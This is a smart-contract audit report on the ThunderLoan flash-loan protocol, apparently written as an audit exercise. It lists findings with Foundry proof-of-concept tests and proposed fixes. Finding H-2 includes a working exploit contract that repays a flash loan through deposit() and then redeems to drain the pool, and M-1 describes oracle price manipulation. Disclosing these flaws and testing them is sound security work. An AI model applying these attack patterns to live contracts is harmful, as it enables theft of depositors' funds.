### [H-1] Unnecessary `updateExchangeRate` in `deposit` function incorrectly updates `exchangeRate` preventing withdraws and unfairly changing reward distribution

**Description:** In the ThunderLoan system, the `exchangeRate` is respoonsible for calculating the exchange rate between assetTokens and underlying tokens. In a way, it's responsible for keeping track of how many fees to give to the LPs.

However, the `deposit` function, updates the rate, without collecting any fees.

```javascript
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
@>      uint256 calculatedFee = getCalculatedFee(token, amount);
@>       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

**Impact:**

1. The `reedem` function is blocked because the protocol thinks the owed tokens is more than it has
2. Rewards are incorrectly calculated, leading to LPs potentially getting way more than they should.

**Proof of Concept:**

1. LP deposits
2. User takes out a flash Loan
3. It is now impossible for LP to redeem because of insufficient balance.

Place the following code in `ThunderLoanTest.t.ts`

```javascript
    function testRedeemAfterLoan() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT * 10;
        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            amountToBorrow
        );
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), calculatedFee);
        thunderLoan.flashloan(
            address(mockFlashLoanReceiver),
            tokenA,
            amountToBorrow,
            ""
        );
        vm.stopPrank();

        uint256 amountToRedeem = type(uint256).max;
        vm.startPrank(liquidityProvider);
        thunderLoan.redeem(tokenA, amountToRedeem);
        vm.stopPrank();
    }
```

</details>

**Recommended Mitigation:** Remove the incorrectly updated exchange rate lines from the `deposit` function.

```diff
    function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
-        uint256 calculatedFee = getCalculatedFee(token, amount);
-        assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

### [H-2] All the funds can be stolen if the flash loan is returned using deposit()

**Description:** An attacker can acquire a flash loan and deposit funds directly into the contract using the **`deposit()`**, enabling stealing all the funds.The **`flashloan()`** performs a crucial balance check to ensure that the ending balance, after the flash loan, exceeds the initial balance, accounting for any borrower fees. This verification is achieved by comparing **`endingBalance`** with **`startingBalance + fee`**. However, a vulnerability emerges when calculating endingBalance using **`token.balanceOf(address(assetToken))`**.

Exploiting this vulnerability, an attacker can return the flash loan using the **`deposit()`** instead of **`repay()`**. This action allows the attacker to mint **`AssetToken`** and subsequently redeem it using **`redeem()`**. What makes this possible is the apparent increase in the Asset contract's balance, even though it resulted from the use of the incorrect function. Consequently, the flash loan doesn't trigger a revert.

**Impact:** All the funds of the AssetContract can be stolen.

**Proof of Concept:**

Place the following code in `ThunderLoanTest.t.ts`

```Solidity
.
.
.
function testDepositInsteadOfRepayToStealFunds()
        public
        setAllowedToken
        hasDeposits
    {
        vm.startPrank(user);
        uint256 amountToBorrow = 50e18;
        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);
        DepositOverRepay dor = new DepositOverRepay(address(thunderLoan));
        tokenA.mint(address(dor), fee);
        thunderLoan.flashloan(address(dor), tokenA, amountToBorrow, "");
        dor.redeemMoney();
        vm.stopPrank();
        assert(tokenA.balanceOf(address(dor)) >= fee + amountToBorrow);
    }
}

contract DepositOverRepay is IFlashLoanReceiver {
    ThunderLoan thunderLoan;
    AssetToken assetToken;
    IERC20 s_token;

    constructor(address _thunderLoan) {
        thunderLoan = ThunderLoan(_thunderLoan);
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external returns (bool) {
        s_token = IERC20(token);
        assetToken = thunderLoan.getAssetFromToken(IERC20(token));
        IERC20(token).approve(address(thunderLoan), amount + fee);
        thunderLoan.deposit(IERC20(token), amount + fee);
        return true;
    }

    function redeemMoney() public {
        uint256 amount = assetToken.balanceOf(address(this));
        thunderLoan.redeem(s_token, amount);
    }
}

```

</details>

**Recommended Mitigation:** Add a check in **`deposit()`** to make it impossible to use it in the same block of the flash loan.
For example registring the block.number in a variable in **`flashloan()`** and checking it in **`deposit()`**.

### [H-3] Mixing up variable location causes storage collisions in `ThunderLoan::s_flashLoanFee` and `ThunderLoan::s_currentlyFlashLoaning`

**Description:** `ThunderLoan.sol` has two variables in the following order:

```javascript
    uint256 private s_feePrecision;
    uint256 private s_flashLoanFee; // 0.3% ETH fee
```

However, the expected upgraded contract `ThunderLoanUpgraded.sol` has them in a different order.

```javascript
    uint256 private s_flashLoanFee; // 0.3% ETH fee
    uint256 public constant FEE_PRECISION = 1e18;
```

Due to how Solidity storage works, after the upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. You cannot adjust the positions of storage variables when working with upgradeable contracts. 


**Impact:** After upgrade, the `s_flashLoanFee` will have the value of `s_feePrecision`. This means that users who take out flash loans right after an upgrade will be charged the wrong fee. Additionally the `s_currentlyFlashLoaning` mapping will start on the wrong storage slot.

**Proof of Code:**

<details>
<summary>Code</summary>
Add the following code to the `ThunderLoanTest.t.sol` file. 

```javascript
// You'll need to import `ThunderLoanUpgraded` as well
import { ThunderLoanUpgraded } from "../../src/upgradedProtocol/ThunderLoanUpgraded.sol";

function testUpgradeBreaks() public {
        uint256 feeBeforeUpgrade = thunderLoan.getFee();
        vm.startPrank(thunderLoan.owner());
        ThunderLoanUpgraded upgraded = new ThunderLoanUpgraded();
        thunderLoan.upgradeTo(address(upgraded));
        uint256 feeAfterUpgrade = thunderLoan.getFee();

        assert(feeBeforeUpgrade != feeAfterUpgrade);
    }
```
</details>

You can also see the storage layout difference by running `forge inspect ThunderLoan storage` and `forge inspect ThunderLoanUpgraded storage`

**Recommended Mitigation:** Do not switch the positions of the storage variables on upgrade, and leave a blank if you're going to replace a storage variable with a constant. In `ThunderLoanUpgraded.sol`:

```diff
-    uint256 private s_flashLoanFee; // 0.3% ETH fee
-    uint256 public constant FEE_PRECISION = 1e18;
+    uint256 private s_blank;
+    uint256 private s_flashLoanFee; 
+    uint256 public constant FEE_PRECISION = 1e18;
```

### [M-1] Using TSwap as price oracle leads to price and oracle manipulation attacks

**Description:** The TSwap protocol is a constant product formula based AMM (automated market maker). The price of a token is determined by how many reserves are on either side of the pool. Because of this, it is easy for malicious users to manipulate the price of a token by buying or selling a large amount of the token in the same transaction, essentially ignoring protocol fees. 

**Impact:** Liquidity providers will drastically reduced fees for providing liquidity. 

**Proof of Concept:** 

The following all happens in 1 transaction. 

1. User takes a flash loan from `ThunderLoan` for 1000 `tokenA`. They are charged the original fee `fee1`. During the flash loan, they do the following:
   1. User sells 1000 `tokenA`, tanking the price. 
   2. Instead of repaying right away, the user takes out another flash loan for another 1000 `tokenA`. 
      1. Due to the fact that the way `ThunderLoan` calculates price based on the `TSwapPool` this second flash loan is substantially cheaper. 
```javascript
    function getPriceInWeth(address token) public view returns (uint256) {
        address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
@>      return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
    }
```
    3. The user then repays the first flash loan, and then repays the second flash loan.

I have created a proof of code located in my `audit-data` folder. It is too large to include here. 

**Recommended Mitigation:** Consider using a different price oracle mechanism, like a Chainlink price feed with a Uniswap TWAP fallback oracle.
